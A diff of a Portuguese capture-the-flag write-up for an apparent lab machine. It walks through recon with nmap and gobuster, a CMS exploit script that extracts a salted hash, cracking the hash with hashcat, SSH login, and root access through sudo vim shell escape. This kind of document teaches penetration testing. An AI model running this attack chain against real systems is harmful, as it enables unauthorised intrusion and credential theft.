@@ -9,6 +9,11 @@
 ---
 
 ```
+ip addr show tun0
+```
+`10.8.32.62`
+
+```
 export IP=10.10.169.195
 ```
 
@@ -33,6 +38,7 @@ nmap -A 10.10.169.195
 |   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
 |_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
 ```
+(INFO: FLAG!)
 
 ---
 
@@ -40,7 +46,7 @@ nmap -A 10.10.169.195
 ```bash
 ftp 10.10.169.195
 ```
-> **Nome de utilizador:** anonymous
+> **ftp Nome de utilizador:** anonymous
 
 ```bash
 ftp> ls
@@ -48,7 +54,7 @@ ftp> cd pub
 ftp> mget *
 ftp> bye
 ```
-**Ficheiro Encontrado:** `ForMitch.txt` (informa que a password é fraca)
+**Ficheiro Encontrado:** `ForMitch.txt` (INFO: Informa que a password é fraca)
 
 ---
 
@@ -56,9 +62,9 @@ ftp> bye
 ```bash
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://$IP -x php,sh,txt,html,js,css,py
 ```
-**Resultado:**
+**Resultado:** `/simple` (Site Type: CMS)
 ```
-http://10.10.169.195/simple (Tipo de Site: CMS)
+http://10.10.169.195/simple
 ```
 
 ---
@@ -69,12 +75,10 @@ http://10.10.169.195/simple (Tipo de Site: CMS)
 python2 46635.py -u http://10.10.169.195/simple
 ```
 **Credenciais Obtidas:**
-```
-Salt for Password: 1dac092e9fa6bb2
-Username: mitch
-Email: admin@admin.com
-Password Hash: 0c01f4468bd75d7a84c7eb73846e8d96
-```
+Salt for Password: `1dac092e9fa6bb2`
+Username: `mitch`
+Email: `admin@admin.com`
+Password Hash: `0c01f4468bd75d7a84c7eb73846e8d96`
 
 ---
 
@@ -82,7 +86,7 @@ Password Hash: 0c01f4468bd75d7a84c7eb73846e8d96
 ```bash
 hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac092e9fa6bb2 /usr/share/wordlist/rockyou.txt
 ```
-**Senha Encontrada:** `secret`
+**Senha Encontrada:** `secret` (INFO: FLAG!)
 
 ---
 
@@ -90,7 +94,7 @@ hashcat -O -a 0 -m 20 0c01f4468bd75d7a84c7eb73846e8d96:1dac092e9fa6bb2 /usr/shar
 ```bash
 ssh mitch@10.10.169.195 -p 2222
 ```
-> **Password:** `secret`
+> **ssh Password:** `secret`
 
 ```bash
 $ whoami
@@ -98,10 +102,7 @@ $ bash
 $ ls
 $ cat user.txt
 ```
-**Mensagem:**
-```
-G00d j0b, keep up!
-```
+**Mensagem:** `G00d j0b, keep up!`
 
 ---
 
@@ -109,17 +110,17 @@ G00d j0b, keep up!
 ```bash
 ls /home
 ```
-**Usuário Identificado:** `sunbath`
+**User Identificado:** `sunbath` (INFO: FLAG!)
 
 ```bash
 sudo -l
 ```
 **Vulnerabilidade Identificada:** `vim` (leverage to spawn a privileged shell)
-
-> Identificar um bypass para o Vim -> **GTFOBins** (vim -> sudo)
+**Site GTFOBins**: (vim -> sudo) Identificar um bypass para o Vim.
 ```bash
 sudo vim -c ':!/bin/sh'
 ```
+
 ```bash
 # whoami
 ```
@@ -131,7 +132,4 @@ sudo vim -c ':!/bin/sh'
 # cat root.txt
 ```
 **Mensagem Final:**
-```
-w3ll d0ne. You made it!
-```
-
+`w3ll d0ne. You made it!` (INFO: FLAG!)
